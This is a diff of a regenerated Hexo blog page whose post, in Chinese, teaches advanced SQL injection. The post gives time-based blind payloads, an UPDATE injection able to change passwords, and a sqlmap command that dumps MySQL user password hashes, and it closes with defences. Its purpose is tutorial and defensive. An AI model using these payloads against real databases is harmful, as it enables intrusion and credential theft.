@@ -2,7 +2,7 @@
 <html lang="en">
 
 <!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.8.0">
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,14 +25,20 @@
     <link rel="canonical" href="https://pengpengp.github.io/2019/01/04/sql-inject-advance/">
 
     <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
 
     <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
 
     <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
-</head>
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <style>
 
@@ -43,8 +49,8 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
-" data-ishome="false">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -119,7 +125,8 @@
 <!--only post-->
 
 
-<img class="wechat-title-img" src="">
+<img class="wechat-title-img"
+     src="">
 
 
 <style>
@@ -146,7 +153,8 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#sql_inject" title="sql_inject">sql_inject</a>
+                        <a class="tag" href="/tags/#sql_inject"
+                           title="sql_inject">sql_inject</a>
                         
                     </div>
                 </div>
@@ -174,7 +182,7 @@
 </blockquote>
 <p>​        <code>select sleep(5)；等待五秒，返回值是0***</code></p>
 <p>​        <code>select if(arg1,arg2,arg3);判断返回值的真假</code></p>
-<p>​        <code>select benchmark(50000,md5(&#39;abc&#39;))</code>前面是执行次数，后面是执行的命令</p>
+<p>​        <code>select benchmark(50000,md5(&#39;abc&#39;)) </code>前面是执行次数，后面是执行的命令</p>
 <ul>
 <li>判断第一个字母的方法</li>
 </ul>
@@ -199,7 +207,7 @@
 <ul>
 <li><p>update语句注入：</p>
 <ul>
-<li>原句：<code>UPDATE Person SET FirstName = &#39;Fred&#39; WHERE LastName = &#39;Wilson&#39;</code></li>
+<li>原句：<code>UPDATE Person SET FirstName = &#39;Fred&#39; WHERE LastName = &#39;Wilson&#39; </code></li>
 <li>构造的语句：<code>update users set pass = &#39;123&#39; where if(length(version())&gt;5,sleep(2),0)#</code></li>
 <li>注意：使用update时一定返回值为0，否则密码全被改掉了！！！</li>
 </ul>
@@ -227,11 +235,14 @@
 <p>三. 正确安全的测试注入步骤（不改数据库）：</p>
 </blockquote>
 <p>​    先–&gt;：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and sleep(1) #</span><br><span class="line">123&quot; and sleep(1) #</span><br><span class="line">123&apos;) and sleep(1) #</span><br><span class="line">123&quot;) and sleep(1) #</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and sleep(1) #</span><br><span class="line">123&quot; and sleep(1) #</span><br><span class="line">123&#39;) and sleep(1) #</span><br><span class="line">123&quot;) and sleep(1) #</span><br></pre></td></tr></table></figure>
+
 <p>​    然后–&gt;：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and id = 100 and sleep(3)#</span><br><span class="line">123&apos; and id = 1 and sleep(3)#</span><br><span class="line">123&apos; and id = 10 and sleep(3)#</span><br><span class="line">123&apos; and id = 11 and sleep(3)#</span><br><span class="line">123&apos; and id = 111 and sleep(3)#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and id &#x3D; 100 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 1 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 10 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 11 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 111 and sleep(3)#</span><br></pre></td></tr></table></figure>
+
 <p>最后–&gt;：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and id = 1 and if(length(version())&gt;5,sleep(3),0) #</span><br><span class="line"></span><br><span class="line">update users set img = &apos;uploads/1546450026timg3.jpg&apos; where name &apos;qwerdf&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and id &#x3D; 1 and if(length(version())&gt;5,sleep(3),0) #</span><br><span class="line"></span><br><span class="line">update users set img &#x3D; &#39;uploads&#x2F;1546450026timg3.jpg&#39; where name &#39;qwerdf&#39;</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li><p>宽字节注入-GBK编码</p>
 <ul>
@@ -252,7 +263,8 @@
 <p>​    -v参数 1-6可以选择显示的详细程度，报告默认保存在家目录下</p>
 <p>​    常规步骤：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--dbs 列出所有的数据库</span><br><span class="line">-D	库 --tables列出所有的表		</span><br><span class="line">-T	表	--columns列出所有的字段		</span><br><span class="line">-C	字段 --dump获取字段内容	</span><br><span class="line">--dump列出详细信息</span><br></pre></td></tr></table></figure>
-<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p>举例：<code>C:\tools\sqlmap-1.2.12&gt;python sqlmap.py --url http://192.168.11.86/index.php?id=1 -D mysql -T user --columns -C password --dump</code></p>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>举例：<code>C:\tools\sqlmap-1.2.12&gt;python sqlmap.py --url http://192.168.11.86/index.php?id=1 -D mysql -T user --columns -C password --dump</code></p>
 <ul>
 <li>五.防御sql注入的方法：<ul>
 <li>1.addslashes(string)；可以把字符中的引号加上\进行转义，但是不能防御数字型注入即id=1 and 类型</li>
@@ -268,12 +280,14 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/01/13/file-update/" data-toggle="tooltip" data-placement="top" title="'file_update'">&larr; Previous Post</a>
+                        <a href="/2019/01/13/file-update/" data-toggle="tooltip" data-placement="top"
+                           title="'file_update'">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2018/12/28/sql-inject-Process/" data-toggle="tooltip" data-placement="top" title="'sql_inject_Process'">Next Post &rarr;</a>
+                        <a href="/2018/12/28/sql-inject-Process/" data-toggle="tooltip" data-placement="top"
+                           title="'sql_inject_Process'">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -292,7 +306,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-text"> </span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
                 </div>
             </div>
         </div>
@@ -344,11 +358,11 @@
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    Copyright &copy; pengpengp&#39;s BLOG 2020
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
                 </p>
 
             </div>
@@ -357,13 +371,19 @@
 </footer>
 
 <!-- jQuery -->
+
 <script src="/js/jquery.min.js"></script>
 
+
 <!-- Bootstrap Core JavaScript -->
+
 <script src="/js/bootstrap.min.js"></script>
 
+
 <!-- Custom Theme JavaScript -->
+
 <script src="/js/blog.js"></script>
+
 
 <!-- async load function -->
 <script>
